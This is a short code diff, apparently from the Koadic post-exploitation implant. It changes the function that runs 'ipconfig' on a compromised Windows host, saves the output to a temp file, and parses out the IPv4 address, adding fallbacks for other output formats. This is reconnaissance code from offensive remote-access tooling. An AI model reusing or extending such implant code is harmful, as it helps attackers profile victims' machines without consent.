@@ -258,9 +258,25 @@ Koadic.user.IPAddrs = function()
 
 Koadic.user.IPAddrs = function()
 {
-    var ipconfig = Koadic.shell.exec("ipconfig", "%TEMP%\\"+Koadic.uuid()+".txt");
-    var ip = ipconfig.split("IPv4 Address")[1].split(": ")[1].split("\r\n")[0];
-    return ip;
+    try
+    {
+        var ipconfig = Koadic.shell.exec("ipconfig", "%TEMP%\\"+Koadic.uuid()+".txt");
+        var ip = ipconfig.split("  IPv4 ")[1].split(": ")[1].split("\r\n")[0];
+        return ip;
+    }
+    catch(e)
+    {
+        try
+        {
+            var ip = ipconfig.split("  IP ")[1].split(": ")[1].split("\r\n")[0];
+            return ip;
+        }
+        // we might need to add more conditions :/
+        catch(e)
+        {}
+    }
+
+    return "";
 }
 
 Koadic.user.info = function()
